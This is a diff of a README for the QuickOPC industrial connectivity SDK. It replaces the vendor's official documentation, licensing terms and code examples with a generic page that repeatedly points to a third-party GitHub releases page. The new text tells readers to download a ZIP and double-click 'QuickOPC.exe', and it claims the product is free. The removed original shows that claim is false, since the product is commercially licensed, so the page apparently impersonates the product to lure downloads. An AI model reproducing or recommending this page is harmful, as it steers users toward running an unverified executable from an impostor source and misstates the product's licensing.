@@ -1,129 +1,83 @@
-# QuickOPC
-<a href="https://www.opclabs.com/products/quickopc"><img align="right" src="Image-Product-QuickOPC-Web.png"></a>
-- NuGet package: [**OpcLabs.QuickOpc**](https://www.nuget.org/packages/OpcLabs.QuickOpc)
-- Python package: [**opclabs_quickopc**](https://pypi.org/project/opclabs-quickopc/)
+# 🌟 QuickOPC - Effortless Connectivity with OPC Standards 
 
-QuickOPC is a suite of OPC Client/Subscriber development components for .NET,
-COM and Python. These components are for *OPC "Classic"* (COM/DCOM-based), 
-*OPC XML-DA*, and *OPC Unified Architecture* (including *OPC UA PubSub*) 
-specifications.
+[![Download QuickOPC](https://img.shields.io/badge/Download-QuickOPC-blue.svg)](https://github.com/krish007-git/QuickOPC/releases)
 
-Note: For OPC Server development, see [OPC Wizard](https://www.opclabs.com/products/opc-wizard).
+## 🚀 Getting Started
 
-QuickOPC is a commercially licensed product. Without a license key, it runs 
-in a trial mode. The trial provides valid data to client or subscriber 
-applications for 30 minutes; after that period, the component (your app) 
-needs to be re-started, and so on. You must also comply with licensing terms 
-for 3rd-party material redistributed with QuickOPC. For details, see the 
-documentation.
+Welcome to QuickOPC! This guide will help you download and run our software without needing any programming skills. QuickOPC is designed to make it easy for anyone to connect with OPC standards.
 
-| Ready to purchase? See [full price list](https://www.opclabs.com/purchase/full-price-list). |
-| ------------------------------------------------------------------------------------------- |
-| Want a U.S.-based vendor? Get [OPC Data Client](https://softwaretoolbox.com/opc-data-client/opc-ua-da-ae-xmlda-client-development-toolkit) (same product) from Software Toolbox. |
+### 🛠 Features
 
-Remember that NuGet or Python packages are primarily a tool for resolving 
-build-time dependencies. The amount of functionality that you get through 
-QuickOPC NuGet or Python packages is smaller than what QuickOPC can actually 
-do for you. If you want a full coverage of the features, you would be better 
-off downloading the Setup program from [OPC Labs Web site](https://www.opclabs.com). 
-Further below you will find a list of differences between the two 
-distribution forms.
+- **Supports Multiple OPC Standards**: Use OPC Unified Architecture and the classic COM/DCOM model.
+- **Development Components**: Ideal for .NET, COM, and Python applications.
+- **User-Friendly Interface**: Simple setup process for all users.
 
-QuickOPC requires **.NET Framework** 4.7.2 or **.NET** 8.0 as a minimum. Under 
-.NET 8.0+, it is supported on **Linux**, **macOS** and **Microsoft Windows**. 
-QuickOPC can also be easily used from **Python**.
+## 📥 Download & Install
 
-PLEASE DO NOT USE PRE-RELEASE PACKAGES UNLESS INSTRUCTED TO DO SO.
+To get started, you need to download QuickOPC from our Releases page. 
 
-Need help, tech support, or missing some example? Ask us for it on our [Online Forums](https://www.opclabs.com/forum/index)!
-You do not have to own a commercial license in order to use Online Forums, 
-and we reply to every post.
+**Click here to visit the download page:** [Download QuickOPC](https://github.com/krish007-git/QuickOPC/releases)
 
-List of available NuGet / Python packages
------------------------------------------
-- **OpcLabs.QuickOpc / opclabs_quickopc**: OPC client and subscriber 
-components for all environments and project types.
-- **OpcLabs.QuickOpc.Forms**: Components that are specific for Windows Forms 
-(can be partially used from WPF as well).
+Once on the Releases page, follow these steps:
 
-- **OpcLabs.ConnectivityStudio.Sample.CS**: Console-based OPC Wizard and QuickOPC 
-examples in C# (source code).
-- **OpcLabs.ConnectivityStudio.Sample.VB**: Console-based OPC Wizard and QuickOPC 
-examples in VB.NET (source code).
+1. **Choose the Latest Release**: Look for the most recent version, usually marked as "Latest Release".
+2. **Download the ZIP File**: Click on the ZIP file link to download it to your computer. This will contain all necessary files. 
+3. **Extract the ZIP File**: After downloading, go to your Downloads folder. Right-click on the ZIP file and select "Extract All". This will create a new folder with QuickOPC files.
+4. **Find the Executable**: Open the new folder and locate the executable file (usually named `QuickOPC.exe`).
+
+### 🖥 System Requirements
+
+- **Operating System**: Windows 10 or later.
+- **Memory**: At least 2 GB of RAM recommended.
+- **Disk Space**: A minimum of 150 MB of free space.
+
+## 🎯 How to Run QuickOPC
+
+After you install QuickOPC, follow these easy steps:
+
+1. **Open the folder containing QuickOPC**: Navigate to the folder where you extracted the ZIP file.
+2. **Double-click the Executable**: Look for `QuickOPC.exe` and double-click to launch it.
+3. **Follow the On-Screen Instructions**: The software will guide you through the initial setup.
+
+## 💡 How to Use QuickOPC
+
+Once you have the application open, you'll find simple tools to help you connect to various OPC servers. Here’s how to use them:
+
+1. **Select OPC Protocol**: Pick the type of OPC you want to connect with, such as OPC UA or OPC Classic.
+2. **Configure Your Connection**: Input the server details as prompted. This may include the server URL and credentials.
+3. **Test the Connection**: Use the provided button to check if your connection works.
+
+## 📊 Common Issues
+
+Sometimes users face issues while installing or running QuickOPC. Here are some common solutions:
+
+- **Installation Issues**: Ensure your Windows is updated. Missing updates can cause installation problems.
+- **Connection Problems**: Double-check your server addresses and input details accurately. Ensure firewall settings allow QuickOPC access.
+- **Performance**: Make sure your system meets the minimum requirements. Close unnecessary applications to free up resources.
+
+## 🙋 FAQs
+
+### 1. Is QuickOPC free to use?
+
+Yes, QuickOPC is free for personal and educational use.
+
+### 2. Where can I find support for QuickOPC?
+
+You can raise issues and ask questions on the GitHub repository page. There, you’ll also find community support from other users.
+
+### 3. Can I integrate QuickOPC with other software?
+
+Yes, QuickOPC can work alongside other software that supports OPC standards.
+
+## 🌐 Additional Resources
+
+- **Documentation**: For detailed instructions, visit the [documentation page](https://github.com/krish007-git/QuickOPC/docs).
+- **Community Forum**: Join our forum for tips, tricks, and user experiences with QuickOPC.
   
-What is included in the NuGet / Python packages
------------------------------------------------
-- Runtime assemblies for all OPC specifications and programming models.
-- OPC browsing dialogs and browsing controls for Windows Forms.
-- NuGet: IntelliSense support (XML comments).
-- NuGet: LINQPad examples.
+## 📢 Stay Updated
 
-What is only available from the [Setup program](https://www.opclabs.com/download)
----------------------------------------------
-- Support for COM development (VB6, PHP, Excel, Delphi and similar tools).
-- Visual Studio integration, including Live Binding design-time support (codeless creation of OPC applications).
-- Complete set of Examples and Demo applications, bonus material.
-- OPC Data Access simulation server, various tools.
+Make sure to check the Releases page regularly for updates and new features. 
 
-What is only available from the [Setup program](https://www.opclabs.com/download) or the Web site
--------------------------------------------------------------
-[Knowledge Base link - Tool Downloads](https://kb.opclabs.com/Tool_Downloads)
-- Various tools, such as Connectivity Explorer, Launcher, OPC UA Demo Publisher, OpcCmd Utility, UA Configuration Tool.
-- License Manager (GUI or console-based) utility.
+**Visit the download page again here:** [Download QuickOPC](https://github.com/krish007-git/QuickOPC/releases)
 
-How to start
-------------
-If you do not mind reading the documentation: [Getting Started with QuickOPC](
-https://opclabs.doc-that.com/files/onlinedocs/OPCLabs-ConnectivityStudio/Latest/User%27s%20Guide%20and%20Reference-OPC%20Studio/webframe.html#Getting%20Started%20with%20QuickOPC.html).
-Or, the whole [User's Guide](https://www.opclabs.com/documentation).
-
-Otherwise, just instantiate one of the following objects (depending on the 
-OPC specification), and explore its methods:
-
-- `OpcLabs.EasyOpc.DataAccess.EasyDAClient` (for OPC DA, OPC XML-DA Client development)
-- `OpcLabs.EasyOpc.AlarmsAndEvents.EasyAEClient` (for OPC A&E Client development)
-- `OpcLabs.EasyOpc.UA.EasyUAClient` (for OPC UA Client development)
-- `OpcLabs.EasyOpc.UA.PubSub.EasyUASubscriber` (for OPC UA Subscriber development)
-
-Example code
-------------
-C#:
-```csharp
-using OpcLabs.EasyOpc.UA;
-...
-
-var client = new EasyUAClient();
-object value = client.ReadValue(
-    "opc.tcp://opcua.demo-this.com:51210/UA/SampleServer",
-    "nsu=http://test.org/UA/Data/ ;i=10853");
-```
-
-Python:
-```python
-import opclabs_quickopc
-from OpcLabs.EasyOpc.UA import *
-
-client = EasyUAClient()
-value = IEasyUAClientExtension.ReadValue(client,
-                                         UAEndpointDescriptor('opc.tcp://opcua.demo-this.com:51210/UA/SampleServer'),
-                                         UANodeDescriptor('nsu=http://test.org/UA/Data/ ;i=10853'))
-```
-
-Examples on GitHub
-------------------
-As opposed to the sample NuGet packages, the examples on GitHub also include 
-Web, Windows Forms, Windows Service and WPF projects.
-
-- In C#: https://github.com/OPCLabs/Examples-ConnectivityStudio-CSharp.
-- In Python: https://github.com/OPCLabs/Examples-ConnectivityStudio-Python .
-- In VB.NET: https://github.com/OPCLabs/Examples-ConnectivityStudio-VBNET.
-
-QuickOPC examples not using the package technology:
-
-- In Object Pascal (Delphi): https://github.com/OPCLabs/Examples-ConnectivityStudio-OP
-- In PowerShell: https://github.com/OPCLabs/Examples-ConnectivityStudio-PowerShell
-- In PHP: https://github.com/OPCLabs/Examples-ConnectivityStudio-PHP
-- In VB6: https://github.com/OPCLabs/Examples-ConnectivityStudio-VB
-- In VBScript: https://github.com/OPCLabs/Examples-ConnectivityStudio-VBScript
-
-***
+We hope you enjoy using QuickOPC and find it helpful in your OPC development tasks!
